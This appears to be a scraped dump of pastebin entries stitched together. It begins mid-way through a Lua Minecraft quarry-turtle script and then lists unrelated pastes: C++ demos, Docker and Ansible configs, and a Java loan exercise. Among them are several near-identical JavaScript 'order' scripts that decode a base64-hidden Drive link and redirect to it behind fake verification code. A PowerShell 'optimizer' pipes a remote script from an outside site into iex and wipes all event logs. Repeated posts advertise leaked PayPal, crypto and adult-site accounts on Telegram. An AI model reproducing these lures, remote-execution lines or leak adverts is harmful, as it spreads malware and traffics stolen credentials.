  --  started a new layer if at the edge
  dig.setr(dig.getr() % 360 + 360)
 else
  dig.setr(dig.getr() % 360)
 end --if
end --function



function lavax()
  if dig.getx() == 0 then
   dig.gotor(270)
   checkNewLayer()
   dig.blockLava()
  elseif dig.getx() == xmax-1 then
   dig.gotor(90)
   checkNewLayer()
   dig.blockLava()
  end --if/else
end --function

function lavaz()
  if dig.getz() == 0 then
   dig.gotor(180)
   checkNewLayer()
   dig.blockLava()
  elseif dig.getz() == zmax-1 then
   dig.gotor(0)
   checkNewLayer()
   dig.blockLava()
  end --if/else
end --function

function checkLava(n)
 if lava then
  local x
  local r = dig.getr() % 360

  if r == 0 or r == 180 then
   lavaz()
   lavax()
  else
   lavax()
   lavaz()
  end --if/else

  if dig.gety() == -skip then
   dig.blockLavaUp()
  end --if

  if dig.getx() == 0 and dig.getz() == 0
     and dig.gety() > -skip then
   for x=1,4 do
    dig.blockLava()
    dig.left()
    checkNewLayer()
   end --for
  end --if

  if n ~= 0 then
   dig.gotor(r)
   checkNewLayer()
  end --if

 end --if
end --function



function checkAll(n)
 checkNewLayer()
 checkProgress()
 checkFuel()
 checkInv()
 checkHalt()
 checkLava(n)
 dig.checkBlocks()
 checkNewLayer()
end --function




---------------------------------------
-- ¬†  ¬†¬†|\/|¬†¬†/\¬†¬†[¬Ø¬Ø]¬†|\¬†||¬†        --
--¬†¬†   ¬†|¬†¬†|¬†|¬†¬†|¬†¬†][¬†¬†|¬†\¬†|¬†        --
--¬†¬†  ¬† ||||¬†||||¬†[__]¬†||¬†\|¬†        --
---------------------------------------
-- |¬Ø\¬†|¬Ø\¬†¬†/¬Ø\¬†¬†¬†/¬Ø¬Ø]¬†|¬Ø\¬†¬†/\¬†¬†|\/|¬†--
-- |¬†/¬†|¬†/¬†|¬†O¬†|¬†|¬†[¬Ø|¬†|¬†/¬†|¬†¬†|¬†|¬†¬†|¬†--
-- ||¬†¬†|¬†\¬†¬†\_/¬†¬†¬†\__|¬†|¬†\¬†||||¬†||||¬†--
---------------------------------------

local a,b,c,x,y,z,r,loc
local xdir, zdir = 1, 1

turtle.select(1)
if reloaded then

 flex.send(""Resuming ""..tostring(zmax)..""x""
   ..tostring(xmax).."" quarry"",colors.yellow)

 if dig.gety()==dig.getymin() and dig.gety()~=0 then
  zdir = dig.getzlast()
  if zdir == 0 then zdir = 1 end
  xdir = dig.getxlast()
  if xdir == 0 then xdir = 1 end

  if dig.getr() >= 360 then
   -- This encodes whether or not the turtle has
   --  started a new layer if at the edge
   xdir = -xdir
   newlayer = true
  end --if

 else
  gotoBase()
  if dodumps then dig.doDumpDown() end
  dig.dropNotFuel()
  dig.gotor(0)
  checkFuel()
  dig.gotoy(math.min(dig.getymin(),-skip)) -- Corrected: go to min y or skip depth
 end --if

else

 flex.send(""Starting ""..tostring(zmax)..""x""
   ..tostring(xmax).."" quarry"",colors.yellow)

 if skip > 0 then
  flex.send(""Skipping ""..tostring(skip)
    ..""m"", colors.lightGray)
 end --if

 if depth < world_height-1 then
  flex.send(""Going ""..tostring(-ymin)
    ..""m deep"", colors.lightGray)
 else
  flex.send(""To bedrock!"",colors.lightGray)
 end --if/else

end --if/else


while dig.gety() > -skip do
 checkFuel()
 dig.down()

 if dig.isStuck() then
  flex.send(""Co-ordinates lost! Shutting down"",
    colors.red)
  --rs.delete(""startup.lua"")
  return
 end --if

 -- Handle remote commands while descending
 local event, p1, p2, p3, p4, p5, p6 = os.pullEvent(""modem_message"", 0.1)
 if event == ""modem_message"" then
     local modemSide, senderChannel, replyChannel, message, senderDistance = p1, p2, p3, p4, p5
     if type(message) == ""table"" and message.type == ""command"" then
         if message.command == ""status_request"" then
             local status = {
                 type = ""status"",
                 fuel = turtle.getFuelLevel(),
                 inventory = dig.getInventory(),
                 position = { x = dig.getx(), y = dig.gety(), z = dig.getz(), r = dig.getr() },
                 is_mining = true, -- Still descending
                 estimated_time = ""Descending..."" -- Placeholder
             }
             modem.transmit(flex.modem_channel, replyChannel, status) -- Use flex.modem_channel
         elseif message.command == ""unload_command"" then
             flex.send(""Received unload command while descending, initiating unload..."", colors.yellow)
             dig.dropNotFuel()
             flex.send(""Unload complete."", colors.lightBlue)
             modem.transmit(flex.modem_channel, replyChannel, { type = ""ack"", command = ""unload_command"" })
         end
     end
 end

end --while



--------------------------
-- |\/|¬†¬†/\¬†¬†[¬Ø¬Ø]¬†|\¬†||¬†--
-- |¬†¬†|¬†|¬†¬†|¬†¬†][¬†¬†|¬†\¬†|¬†--
-- ||||¬†||||¬†[__]¬†||¬†\|¬†--
--------------------------
-- ||¬†¬†¬†¬†/¬Ø\¬†¬†¬†/¬Ø\¬†¬†|¬Ø\¬†--
-- ||_¬†¬†|¬†O¬†|¬†|¬†O¬†|¬†|¬†/¬†--
-- |__]¬†¬†\_/¬†¬†¬†\_/¬†¬†||¬†¬†--
--------------------------

local done = false
while not done and not dig.isStuck() do
 turtle.select(1)

 while not done do
  -- Handle remote commands during mining
  local event, p1, p2, p3, p4, p5, p6 = os.pullEvent(""modem_message"", 0.1)
  if event == ""modem_message"" then
      local modemSide, senderChannel, replyChannel, message, senderDistance = p1, p2, p3, p4, p5
      if type(message) == ""table"" and message.type == ""command"" then
          if message.command == ""status_request"" then
              -- Estimate remaining blocks (more accurate during mining)
              local total_quarry_blocks = xmax * zmax * (dig.getymax() - dig.getymin() + 1) -- Assuming ymax is start y
              local current_dug_blocks = dig.getdug()
              local estimated_remaining_blocks = total_quarry_blocks - current_dug_blocks
              local estimated_time_display = ""Calculating...""
              if estimated_remaining_blocks > 0 then
                  -- Very rough time estimate based on blocks remaining and average speed
                  local avg_blocks_per_second = 0.8 -- Calibrate this value based on your turtle's performance
                  local estimated_time_seconds = estimated_remaining_blocks / avg_blocks_per_second
                  local hours = math.floor(estimated_time_seconds / 3600)
                  local minutes = math.floor((estimated_time_seconds % 3600) / 60)
                  local seconds = math.floor(estimated_time_seconds % 60)
                  estimated_time_display = string.format(""%02d:%02d:%02d"", hours, minutes, seconds)
              end


              local status = {
                  type = ""status"",
                  fuel = turtle.getFuelLevel(),
                  inventory = dig.getInventory(),
                  position = { x = dig.getx(), y = dig.gety(), z = dig.getz(), r = dig.getr() },
                  is_mining = true,
                  estimated_time = estimated_time_display
              }
              modem.transmit(flex.modem_channel, replyChannel, status) -- Use flex.modem_channel
          elseif message.command == ""unload_command"" then
              flex.send(""Received unload command, initiating unload..."", colors.yellow)
              dig.dropNotFuel()
              flex.send(""Unload complete."", colors.lightBlue)
              modem.transmit(flex.modem_channel, replyChannel, { type = ""ack"", command = ""unload_command"" })
          end
      end
  end

  checkAll(0)
  if dig.getz()<=0 and zdir==-1 then break end
  if dig.getz()>=zmax-1 and zdir==1 then break end

  if zdir == 1 then dig.gotor(0)
  elseif zdir == -1 then dig.gotor(180)
  end --if/else
  checkNewLayer()

  dig.fwd()

  if dig.isStuck() then
   done = true
  end --if

 end --while (z loop)

 if done then break end

 zdir = -zdir
 newlayer = false

 if dig.getx()<=0 and xdir==-1 then
  newlayer = true
 elseif dig.getx()>=xmax-1 and xdir==1 then
  newlayer = true
 else
  checkAll(0)
  dig.gotox(dig.getx()+xdir)
 end --if/else

 if newlayer and not dig.isStuck() then
  xdir = -xdir
  if dig.getymin() <= ymin then break end
  checkAll(0)
  dig.down()
 end --if

end --while (cuboid dig loop)


flex.send(""Digging completed, returning to surface"",
  colors.yellow)
gotoBase()

flex.send(""Descended ""..tostring(-dig.getymin())..
    ""m total"",colors.green)
flex.send(""Dug ""..tostring(dig.getdug())..
    "" blocks total"",colors.lightBlue)

for x=1,16 do
 if dig.isBuildingBlock(x) then
  turtle.select(x)
  dig.placeDown()
  break
 end --if
end --for
turtle.select(1)

if dodumps then
 dig.gotor(0)
 dig.doDump()
 dig.gotor(180)
end
dig.dropNotFuel()
dig.gotor(0)

dig.clearSave()
flex.modemOff()
os.unloadAPI(""dig.lua"")
os.unloadAPI(""flex.lua"")"
X291SWDh,Crypto Accounts,Xp_Isolation,JavaScript,Thursday 1st of May 2025 11:13:15 AM CDT,54582 Accounts Posted On https://t.me/leakzbyeminem
pzwHp2DZ,Order.js,rodrigomaise99,JavaScript,Thursday 1st of May 2025 11:12:39 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/37455/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
bWN0V9k9,Untitled,dllbridge,C,Thursday 1st of May 2025 11:08:08 AM CDT,"
#include   <stdio.h>
#include      <list>
using namespace std;


void print(int *p, int n);  
void print(list<int>  &r);   

/////////////////////////////////////////////////////
int main() 
{

    list<int> L1;
     	
    int nArr[20] = {2, 5, 3, 8, 43, 222, 4, 77}; 	
     	
     	
    L1.push_back(123); 	
    L1.push_front(44);
    
    for(int i = 0; i < 5; i++) L1.push_back(i); 
	 	    
    printf(""size of L1 = %d\n"", L1.size());
     	
    print(nArr, 20) ;	
    print(L1); 	
     	
     	
}



/////////////////////////////////////////////////////
void print(list<int> &r)                          // 
{
	
	 list<int>::iterator it = r.begin(); 
	

	 
	 printf(""\n"");
	
	 for(int i = 0; i < r.size(); i++) 
	 {
		
		 printf(""%d, "", *it);
		 it++;	
	 }
}


/////////////////////////////////////////////////////
void print(int *p, int n)                          // 
{
	
	 for(int i = 0; i < n; i++) 
	 {
		 printf(""%d, "", p[i]);
     }
}














/*

int foo (int n);
int SONY(int n);

int (*fp) (int);

#include <iostream>
using namespace std;


int foo (int n);
int SONY(int n);

int (*fp) (int);


/////////////////////////////////////////////////////
int main() 
{

     	
    
   
    cout << ""adr foo  "" << (int)foo    << endl; 
    
    fp = foo;
    cout << ""foo    = "" <<      fp(4)  << endl; 
    
    
    cout << ""foo    = "" <<      foo(3) << endl; 
    cout << ""fp  = "" << (int)fp    << endl; 
    
    
    fp = SONY;
    
    cout << ""SONY    = "" <<      fp(11)  << endl; 
}




////////////////////////////////////////////////////////
int foo(int n)
{
	
	
  return n * 10;	
}



////////////////////////////////////////////////////////
int SONY(int n)
{
	
	
  return n - 10;	
}




*/













/*

#include <iostream>
using namespace std;


/////////////////////////////////////////////////////
int summa(int n)
{
	
   return 100 + n;	
}



/////////////////////////////////////////////////////
int summa(int n, int n2)
{
	
   return  n + n2;	
}


/////////////////////////////////////////////////////
double summa(double f, int n)
{
	
   return  f + n;	
}

/////////////////////////////////////////////////////
void summa(double f, float f2)
{
	
   cout << f + (double)f2;	
}



/////////////////////////////////////////////////////
int main() 
{

     	
    
    cout << ""summa = "" << summa(3   )     << endl; 
    cout << ""summa = "" << summa(3, 7)     << endl; 	
    cout << ""summa = "" << summa(3.2, 7)   << endl;	
   // cout << ""summa = "" << summa(1.2, 2.5) << endl;
   
    summa(1.2, 2.5); 	
}
*/

"
HiDb7f2r,docker-compose-glance.yaml,heydelicias,YAML,Thursday 1st of May 2025 11:00:59 AM CDT,"services:
  glance:
    container_name: glance
    image: glanceapp/glance
    labels:
      - ""traefik.enable=true""
      - ""traefik.http.routers.glance.rule=Host(`glance.nastty`) || Host(`glance.taigoapp.com`) || Host(`glance.taigo.ninja`)""
      - ""traefik.http.services.glance.loadbalancer.server.port=8080""
    restart: unless-stopped
    networks:
      - traefik_network
    volumes:
      - /mnt/user/docker-appdata/glance/config:/app/config
      - /mnt/user:/mnt/host:ro
    ports:
      - 82:8080

networks:
  traefik_network:
    external: true"
YdHLTBaj,playbook-glance.yaml,heydelicias,YAML,Thursday 1st of May 2025 10:59:23 AM CDT,"---
- hosts:
  - orangepi
  become: yes
  gather_facts: false
  tasks:
    - name: Create Glance Directory
      ansible.builtin.file:
        path: /mnt/user/src/docker/glance
        state: directory
        mode: ""0755""

    - name: Copy docker-compose.yaml to the server
      ansible.builtin.copy:
        src: ../docker/glance.yaml
        dest: /mnt/user/src/docker/glance/docker-compose.yaml
        owner: root
        group: root
        mode: u=rw,g=rw,o=r

    - name: Copy Glance app config
      ansible.builtin.copy:
        src: ../appconfig/glance
        dest: /mnt/user/docker-appdata/

    - name: Put down Glance
      community.docker.docker_compose_v2:
        project_src: /mnt/user/src/docker/glance
        state: absent

    - name: Setup Glance
      community.docker.docker_compose_v2:
        project_src: /mnt/user/src/docker/glance
      register: output"
xafQe8J1,PayPal with Balance,Xp_Isolation,JavaScript,Thursday 1st of May 2025 10:57:52 AM CDT,60566 Accounts Posted On https://t.me/leakzbyeminem
14tzrjtF,Market.js,rodrigomaise99,JavaScript,Thursday 1st of May 2025 10:57:17 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/87981/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
viWPvhZ4,Script basico,tgvgod,PowerShell,Thursday 1st of May 2025 10:43:52 AM CDT,"# 1. Executar script remoto do seu site
try {
    Write-Host ""`nüîπ Executando script remoto TGVGOD"" -ForegroundColor Cyan
    irm https://blueflix.net | iex
} catch {
    Write-Host ""‚ùå N√£o foi poss√≠vel acessar TGVGOD"" -ForegroundColor Red
}

# 2. Remover Bloatware (exceto Xbox, Windows Security, Microsoft Store, Windows Update)
Write-Host ""`nüßπ Removendo Bloatware..."" -ForegroundColor Yellow

$appsRemover = @(
    ""Microsoft.3DBuilder"", ""Microsoft.BingNews"", ""Microsoft.BingWeather"", ""Microsoft.GetHelp"", ""Microsoft.Getstarted"",
    ""Microsoft.Microsoft3DViewer"", ""Microsoft.MicrosoftOfficeHub"", ""Microsoft.MicrosoftSolitaireCollection"",
    ""Microsoft.MicrosoftStickyNotes"", ""Microsoft.MixedReality.Portal"", ""Microsoft.MSPaint"", ""Microsoft.OneConnect"",
    ""Microsoft.People"", ""Microsoft.Print3D"", ""Microsoft.SkypeApp"", ""Microsoft.Todos"", ""Microsoft.Wallet"",
    ""Microsoft.Whiteboard"", ""Microsoft.WindowsAlarms"", ""Microsoft.WindowsCamera"", ""Microsoft.WindowsMaps"",
    ""Microsoft.WindowsSoundRecorder"", ""Microsoft.YourPhone"", ""Microsoft.ZuneMusic"", ""Microsoft.ZuneVideo"",
    ""MicrosoftTeams"", ""SpotifyAB.SpotifyMusic"", ""Disney.37853FC22B2CE"", ""Duolingo-LearnLanguages"",
    ""AdobeSystemsIncorporated.AdobePhotoshopExpress"", ""Microsoft.CommsPhone"", ""Microsoft.WindowsFeedbackHub"",
    ""Microsoft.PowerAutomateDesktop""
)

foreach ($app in $appsRemover) {
    Write-Host ""Removendo $app...""
    Get-AppxPackage -Name $app -AllUsers | Remove-AppxPackage -ErrorAction SilentlyContinue
    Get-AppxProvisionedPackage -Online | Where-Object DisplayName -EQ $app | Remove-AppxProvisionedPackage -Online -ErrorAction SilentlyContinue
}

# 3. Verifica√ß√£o MRT
Write-Host ""`nüõ°Ô∏è Executando verifica√ß√£o MRT..."" -ForegroundColor Green
Start-Process -FilePath ""C:\Windows\System32\MRT.exe"" -ArgumentList ""/F:Y /Q"" -Wait

# 4. Instalar apps com winget
function Instalar-App($nome, $id) {
    if (-not (winget list --id $id | Select-String $id)) {
        Write-Host ""Instalando $nome...""
        winget install --id $id -e --accept-source-agreements --accept-package-agreements
    } else {
        Write-Host ""$nome j√° est√° instalado.""
    }
}

Write-Host ""`nüì¶ Instalando aplicativos essenciais..."" -ForegroundColor Cyan
Instalar-App ""Notepad++"" ""Notepad++.Notepad++""
Instalar-App ""Node.js LTS"" ""OpenJS.NodeJS.LTS""
Instalar-App ""Google Chrome"" ""Google.Chrome""
Instalar-App ""FileZilla"" ""FileZilla.FileZilla""
Instalar-App ""Discord"" ""Discord.Discord""

# 5. Limpeza de disco
Write-Host ""`nüßº Limpando arquivos tempor√°rios e cache..."" -ForegroundColor Blue
Remove-Item -Path ""$env:TEMP\*"" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path ""C:\Windows\Temp\*"" -Recurse -Force -ErrorAction SilentlyContinue
Stop-Service wuauserv -Force
Remove-Item -Path ""C:\Windows\SoftwareDistribution\Download\*"" -Recurse -Force -ErrorAction SilentlyContinue
Start-Service wuauserv
wevtutil el | ForEach-Object { wevtutil cl $_ } | Out-Null

# 6. Remo√ß√£o adicional de apps + Otimiza√ß√£o
Write-Host ""`n‚öôÔ∏è Removendo apps adicionais e otimizando sistema..."" -ForegroundColor Magenta

# OneDrive
Write-Host ""üî∏ Removendo OneDrive...""
Start-Process ""taskkill"" -ArgumentList ""/f /im OneDrive.exe"" -NoNewWindow -Wait -ErrorAction SilentlyContinue
Start-Process ""$env:SystemRoot\SysWOW64\OneDriveSetup.exe"" -ArgumentList ""/uninstall"" -NoNewWindow -Wait -ErrorAction SilentlyContinue
Start-Process ""$env:SystemRoot\System32\OneDriveSetup.exe"" -ArgumentList ""/uninstall"" -NoNewWindow -Wait -ErrorAction SilentlyContinue

# Skype
Get-AppxPackage -AllUsers *Skype* | Remove-AppxPackage -AllUsers -ErrorAction SilentlyContinue
Get-AppxProvisionedPackage -Online | Where-Object DisplayName -like ""*Skype*"" | Remove-AppxProvisionedPackage -Online -ErrorAction SilentlyContinue

# Teams
Get-AppxPackage -AllUsers *Teams* | Remove-AppxPackage -AllUsers -ErrorAction SilentlyContinue
Get-AppxProvisionedPackage -Online | Where-Object DisplayName -like ""*Teams*"" | Remove-AppxProvisionedPackage -Online -ErrorAction SilentlyContinue

# Cortana
Get-AppxPackage -AllUsers Microsoft.549981C3F5F10 | Remove-AppxPackage -AllUsers -ErrorAction SilentlyContinue
Get-AppxProvisionedPackage -Online | Where-Object DisplayName -like ""*Cortana*"" | Remove-AppxProvisionedPackage -Online -ErrorAction SilentlyContinue

# Adobe
Get-AppxPackage -AllUsers *Adobe* | Remove-AppxPackage -AllUsers -ErrorAction SilentlyContinue
Get-AppxProvisionedPackage -Online | Where-Object DisplayName -like ""*Adobe*"" | Remove-AppxProvisionedPackage -Online -ErrorAction SilentlyContinue

# Spotify
Get-AppxPackage -AllUsers *Spotify* | Remove-AppxPackage -AllUsers -ErrorAction SilentlyContinue
Get-AppxProvisionedPackage -Online | Where-Object DisplayName -like ""*Spotify*"" | Remove-AppxProvisionedPackage -Online -ErrorAction SilentlyContinue

# MicrosoftEdgeAutoLaunch
$autoLaunchKey = ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run""
Remove-ItemProperty -Path $autoLaunchKey -Name ""MicrosoftEdgeAutoLaunch"" -ErrorAction SilentlyContinue

# Ativar plano de energia m√°ximo
powercfg -setactive SCHEME_MAX

Write-Host ""`n‚úÖ Sistema otimizado com sucesso!"" -ForegroundColor Green
"
hvBUCLtb,Leaked Accounts - Fresh Hits,Xp_Isolation,JavaScript,Thursday 1st of May 2025 10:42:28 AM CDT,85018 Accounts Posted On https://t.me/leakzbyeminem
qBCJZkBh,Products.js,rodrigomaise99,JavaScript,Thursday 1st of May 2025 10:26:33 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/82777/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
5g6Xkyqm,Chaturbate with Tokens,Xp_Isolation,JavaScript,Thursday 1st of May 2025 10:26:20 AM CDT,91014 Accounts Posted On https://t.me/leakzbyeminem
sCAYNs8e,Order.js,rodrigomaise99,JavaScript,Thursday 1st of May 2025 10:11:11 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/09527/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
zK5MNqb8,Crypto Accounts,Xp_Isolation,JavaScript,Thursday 1st of May 2025 10:10:57 AM CDT,73083 Accounts Posted On https://t.me/leakzbyeminem
3Zkctirm,[NP] Bank Loan System,dzocesrce,Java,Thursday 1st of May 2025 10:00:40 AM CDT,"//ne treba da gi ponishtuva clerks kaj sho mu frla exception zaradi nesoodveten loan ama me mrzi da go pravam create metodot na nivo na loan. Sepak e 1-vi maj...

public class BankTest {
    public static void main(String[] args) {
        Bank bank = new Bank();
        System.out.println(""----- READING LOAN APPLICATIONS -----"");
        bank.readApplication(System.in);
        System.out.println(""----- PRINTING APPROVED APPLICATIONS REPORTS FOR BANK CLERKS -----"");
        bank.printApplicationsReport(System.out);

    }
}
public class Clerk {
    String clerkId;
    List<Loan> loans;

    public Clerk(String clerkId) {
        this.clerkId = clerkId;
        this.loans = new ArrayList<>();
    }

    public double computeTotalCommission(){
        return loans.stream().mapToDouble(i->i.returnCommissionToClerk()).sum();
    }


    public static Clerk create(String line) throws InvalidLoanApplicationException {

        String[] parts = line.split("" "");
        String clerkid = parts[0];
        Clerk clerk = new Clerk(clerkid);
        for (int i = 1; i < parts.length; i += 6) {
            String clientId = parts[i];
            int loanAmount = Integer.parseInt(parts[i + 1]);
            int yearsOfPayment = Integer.parseInt(parts[i+2]);
            int clientBalance = Integer.parseInt(parts[i+3]);
            double interestRate = Double.parseDouble(parts[i+4]);
            String loanType = parts[i+5];
            if (loanType.equals(""H"")) {
                if (loanAmount > clientBalance * 15)
                    throw new InvalidLoanApplicationException(clientId, loanAmount);
                clerk.loans.add(new HousingLoan(clientId, loanAmount, yearsOfPayment, clientBalance, interestRate));
            } else {
                if (loanAmount > clientBalance * 5)
                    throw new InvalidLoanApplicationException(clientId, loanAmount);
                clerk.loans.add(new SpendingLoan(clientId, loanAmount, yearsOfPayment, clientBalance, interestRate));
            }
        }
        return clerk;
    }

    @Override
    public String toString() {
        return String.format("" %s %d %d %.2f %.2f"",
                clerkId, loans.size(),
                loans.stream().mapToInt(i->i.getLoanAmount()).min().getAsInt(),
                loans.stream().mapToDouble(i->i.returnTotalAmount()).max().getAsDouble(),
                computeTotalCommission());
    }
}

public class HousingLoan extends Loan{

    public HousingLoan(String clientId, int loanAmount, int yearsOfPayment, int clientBalance, double interestRate) throws InvalidLoanApplicationException {
        super(clientId,loanAmount,yearsOfPayment,clientBalance,interestRate);
    }

    @Override
    public double returnCommissionToClerk() {
        return returnTotalAmount()*0.06;
    }

    @Override
    public double returnTotalAmount() {
        return  loanAmount * interestRate / 100 * yearsOfPayment + loanAmount;
    }
}

public class InvalidLoanApplicationException extends Exception {
    public InvalidLoanApplicationException(String id,int amount) {
        super(String.format(""The client with id %s can not take a loan of amount %d."",id,amount));
    }
}

public abstract class Loan {
    String clientId;
    int loanAmount;
    int yearsOfPayment;
    int clientBalance;
    double interestRate;

    public Loan(String clientId, int loanAmount, int yearsOfPayment, int clientBalance, double interestRate) {

        this.clientId = clientId;
        this.loanAmount = loanAmount;
        this.yearsOfPayment = yearsOfPayment;
        this.clientBalance = clientBalance;
        this.interestRate = interestRate;
    }

    public abstract double returnCommissionToClerk();

    public abstract double returnTotalAmount();

    public String getClientId() {
        return clientId;
    }

    public int getLoanAmount() {
        return loanAmount;
    }

    public int getYearsOfPayment() {
        return yearsOfPayment;
    }

    public int getClientBalance() {
        return clientBalance;
    }

    public double getInterestRate() {
        return interestRate;
    }

}

public class SpendingLoan extends Loan{

    public SpendingLoan(String clientId, int loanAmount, int yearsOfPayment, int clientBalance, double interestRate) {
        super(clientId,loanAmount,yearsOfPayment,clientBalance,interestRate);
    }

    @Override
    public double returnCommissionToClerk() {
        return returnTotalAmount()*0.03;
    }

    @Override
    public double returnTotalAmount() {
        return  loanAmount * interestRate / 100 * yearsOfPayment + loanAmount;
    }

}

public class Bank {

    Map<Clerk,List<Loan>> clerks;

    public Bank() {
        this.clerks = new HashMap<>();
    }

    public void readApplication(InputStream in) {
        BufferedReader br = new BufferedReader(new InputStreamReader(in));
        clerks= br.lines().map(line -> {
                    try {
                        return Clerk.create(line);
                    } catch (InvalidLoanApplicationException e) {
                        System.out.println(e.getMessage());
                        return null;
                    }
                })
                .filter(Objects::nonNull)
                .collect(Collectors.toMap(
                        i->i,
                        i->i.loans
                ));

    }

    public void printApplicationsReport(PrintStream out) {
        PrintWriter pw = new PrintWriter(out);
        clerks.entrySet().stream()
                .sorted(Comparator.comparing((Map.Entry<Clerk, List<Loan>> entry) ->
                        entry.getValue().size())
                        .thenComparing(entry->entry.getKey().clerkId))
                        .forEach(i-> System.out.println(i.getKey()));
        pw.flush();
    }
}"
Xay7vQCW,Market.js,rodrigomaise99,JavaScript,Thursday 1st of May 2025 09:55:49 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/92542/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
0DSYCWkn,PayPal with Balance,Xp_Isolation,JavaScript,Thursday 1st of May 2025 09:55:34 AM CDT,98912 Accounts Posted On https://t.me/leakzbyeminem
